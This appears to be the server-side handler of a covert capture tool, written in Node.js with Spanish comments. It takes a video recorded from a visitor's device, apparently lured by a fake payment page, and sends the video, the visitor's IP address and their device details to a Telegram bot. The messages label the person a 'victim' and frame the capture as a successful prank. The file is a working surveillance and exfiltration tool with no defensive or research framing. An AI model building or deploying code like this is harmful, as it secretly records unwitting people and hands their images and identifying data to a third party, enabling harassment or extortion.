const formidable = require('formidable');
const fs = require('fs');

// Función para enviar video a Telegram
async function sendVideoToTelegram(videoBuffer, message, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram no configurado');
    return;
  }

  try {
    // Primero enviar el mensaje de texto
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    // Luego enviar el video usando multipart/form-data manual
    const boundary = '----formdata-' + Date.now();
    const videoFileName = `video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm`;
    
    let body = '';
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
    body += `🎥 Video de la víctima capturado\r\n`;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="video"; filename="${videoFileName}"\r\n`;
    body += `Content-Type: video/webm\r\n\r\n`;
    
    // Convertir buffer a binary string
    const binaryString = videoBuffer.toString('binary');
    body += binaryString;
    body += `\r\n--${boundary}--\r\n`;
    
    const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': Buffer.byteLength(body, 'binary')
      },
      body: Buffer.from(body, 'binary')
    });

    if (videoResponse.ok) {
      console.log('Video enviado a Telegram');
    }
  } catch (error) {
    console.error('Error enviando video a Telegram:', error);
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               'unknown';
               
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Parsear el video usando formidable
    const form = formidable({
      maxFileSize: 50 * 1024 * 1024, // 50MB max
      keepExtensions: true
    });

    const [fields, files] = await form.parse(req);
    
    if (!files.video || !files.video[0]) {
      return res.status(400).json({ status: 'error', message: 'No video file received' });
    }

    const videoFile = files.video[0];
    const videoBuffer = require('fs').readFileSync(videoFile.filepath);
    const fileSize = (videoFile.size / 1024 / 1024).toFixed(2); // MB

    // Crear mensaje para Telegram
    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b>
    
📱 <b>IP Víctima:</b> <code>${ip}</code>
🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip}.webm</code>
📊 <b>Tamaño:</b> ${fileSize} MB
⏰ <b>Hora captura:</b> ${timestamp}
🌐 <b>Dispositivo:</b> ${userAgent.substring(0, 80)}...

🎭 <b>¡La broma fue un éxito!</b>
💰 <b>Creyó que pagaste:</b> ฿6,100.00`;

    // Enviar a Telegram
    await sendVideoToTelegram(videoBuffer, message, ip);

    // Log
    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB`);

    res.json({ 
      status: 'success', 
      message: 'Video grabado correctamente',
      filename: `video_${Date.now()}_${ip}.webm`
    });

  } catch (error) {
    console.error('Error processing video:', error);
    res.status(500).json({ status: 'error', message: 'Error processing video' });
  }
}; 